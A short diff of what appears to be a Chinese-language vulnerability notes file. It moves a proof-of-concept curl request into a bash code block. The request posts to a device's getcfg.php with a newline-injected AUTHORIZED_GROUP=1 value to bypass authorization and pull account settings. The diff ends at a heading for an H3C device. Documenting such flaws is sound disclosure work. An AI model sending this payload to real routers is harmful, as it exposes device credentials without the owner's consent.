@@ -176,7 +176,11 @@ else
 
 ![截屏2021-07-16 下午3.55.48.png](https://i.loli.net/2021/07/16/QxocdSr2PITnA9J.png)
 
-`Poc: curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://{ip.addr}:{ip.port}/info/getcfg.php"`
+`Poc:`
+
+```bash
+curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://{ip.addr}:{ip.port}/info/getcfg.php"
+```
 
 ## 一：*H3C-AM8000V100R008*
 
